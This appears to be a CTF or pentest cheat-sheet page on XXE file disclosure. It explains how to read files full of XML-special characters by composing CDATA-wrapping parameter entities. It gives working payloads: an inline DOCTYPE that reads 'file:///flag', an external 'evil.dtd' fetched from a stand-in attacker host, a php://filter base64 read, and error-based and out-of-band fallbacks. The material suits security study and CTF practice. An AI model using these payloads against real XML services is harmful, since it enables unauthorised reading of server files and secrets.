# CDATA Wrapping — reading files that break the parser

## The problem — file content with `<`/`&`/`]]>`

`file:///flag` containing `<` or `&` gets re-parsed after substitution
→ well-formedness error → the read fails or is truncated at the first
special char.

## The CDATA trick — wrap the file in `]]>`/`CDATA[` markers

Compose the result as `CDATA[ file-content ]]` via param entities:

```xml
<!DOCTYPE r [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY cdata '%start;%file;%end;'>">
  %all;
]>
<r>&cdata;</r>
```

- `%start;` → literal `<![CDATA[`
- `%file;` → file content (special chars and all)
- `%end;` → `]]>`
- `%all;` builds the declaration `<!ENTITY cdata '<![CDATA[...]]>'>`
- `&cdata;` in the body emits the file as a CDATA section — safe to echo

## The strict-parser caveat — needs external subset

`%all;` (param-entity inside an entity value inside internal subset) —
strict parsers reject it. The portable form puts the composition in an
external DTD — `external-dtd.md`:

```xml
<!-- your evil.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % end "]]>">
<!ENTITY cdata "%start;%file;%end;">
```

then `<!ENTITY % d SYSTEM "http://YOU/e.dtd">%d;` + `&cdata;` in body.

## The simpler `<![CDATA[` self-wrap — when content is one-shot

If you control the ENTITY VALUE itself (internal entity), just wrap:

```xml
<!ENTITY x "<![CDATA[ ... ]]">
```

Doesn't help for *file content* — the file's bytes are read at
substitution time, not authored — the param-entity composition above
is the answer for files.

## The partial-wrap fallback — read up to the offending char

Without CDATA, `file:///flag` with `&` inside errors out — but SOME
parsers substitute up to the error — the response/error may contain
the prefix before the bad char. Iterating the path/offset — niche.

## Alternative — base64-wrap the file

For PHP targets: `php://filter/convert.base64-encode/resource=/flag` —
the entity value is base64 — no special chars at all. The cleanest
binary/special-char read on PHP stacks.

## Java-side — `netdoc:`/`file:` plus the parse-coercion

No `php://filter` on Java — the CDATA composition is the Java path for
special-char files. Or use the error channel — the truncated content
still appears in the FileNotFound URI sometimes — `error-based.md`.

## Falsifiers

- parser refuses param-entity composition AND no `php://filter` —
  files with XML-special bytes stay unreadable via in-band; OOB may
  still work
